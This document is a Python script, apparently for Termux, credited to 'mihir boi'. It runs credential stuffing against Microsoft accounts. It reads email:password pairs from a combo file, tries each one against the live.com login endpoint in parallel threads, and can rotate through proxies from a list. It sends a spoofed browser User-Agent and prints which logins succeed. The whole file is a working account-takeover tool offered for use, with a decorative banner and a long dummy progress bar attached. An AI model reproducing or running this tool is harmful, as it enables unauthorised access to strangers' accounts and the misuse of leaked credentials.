import requests
import threading
import os
from colorama import Fore, Style
from tqdm import trange  # Ensure tqdm is installed for progress bar

def login(email, password, use_proxy, proxy=None):
    try:
        session = requests.Session()

        if use_proxy and proxy:
            session.proxies = {"http": proxy, "https": proxy}

        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Mobile Safari/537.36"
        }
        data = {
            "loginfmt": email,
            "passwd": password
        }
        response = session.post("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=163>", headers=headers, data=data)

        if "Welcome back" in response.text:
            print(f"{Fore.GREEN}[+] Login successful: {email}:{password}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Login failed: {email}:{password}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}{Style.RESET_ALL}")

def main():
    try:
        use_proxy = input("Do you want to use proxies? (yes/no): ").strip().lower() == "yes"

        if use_proxy:
            proxy_file_path = "/data/data/com.termux/files/home/mcfa/proxy.txt"
            with open(proxy_file_path, "r") as f:
                proxies = f.readlines()
        else:
            proxies = [None]  # Use None if not using proxies

        combo_file_path = "/data/data/com.termux/files/home/mcfa/combo.txt"
        with open(combo_file_path, "r") as f:
            combos = f.readlines()

        threads = []
        for combo in combos:
            email, password = combo.strip().split(":")
            for proxy in proxies:
                thread = threading.Thread(target=login, args=(email, password, use_proxy, proxy.strip() if proxy else None))
                threads.append(thread)

        for thread in threads:
            thread.start()

        for thread in threads:
            thread.join()

    except Exception as e:
        print(f"{Fore.RED}[-] Error in main: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    # Clear screen in Termux
    os.system('clear')

    # Color bars setup (if you intend to use this for some visual effect)
    color_bars = [
        Fore.GREEN,
    ]

    # Printing color bars (if needed)
    for color in color_bars:
        for _ in trange(int(7**7.5), bar_format="{l_bar}%s{bar}%s{r_bar}" % (color, Style.RESET_ALL)):
            pass

    # Print your banner or information here
    print(f"{Fore.GREEN}\n.        :   :::  ::   .:  ::::::::::..   :::::::.      ...     :::")
    print(";;,.    ;;;  ;;; ,;;   ;;, ;;;;;;;``;;;;   ;;;'';;'  .;;;;;;;.  ;;;")
    print("[[[[, ,[[[[, [[[,[[[,,,[[[ [[[ [[[,/[[['   [[[__[[\.,[[     \[[,[[[")
    print("$$$$$$$$\"$$$ $$$\"$$$\"\"\"$$$ $$$ $$$$$$c     $$\"\"\"\"Y$$$$$,     $$$$$$")
    print("888 Y88\" 888o888 888   \"88o888 888b \"88bo,_88o,,od8P\"888,_ _,88P888")
    print("MMM  M'  \"MMMMMM MMM    YMMMMM MMMM   \"W\" \"\"YUMMMP\"   \"YMMMMMP\" MMM")
    print("                       ©copyright by \033[93mmihir boi \033[97m")
    print(Style.RESET_ALL)

    print(" ")

    main()

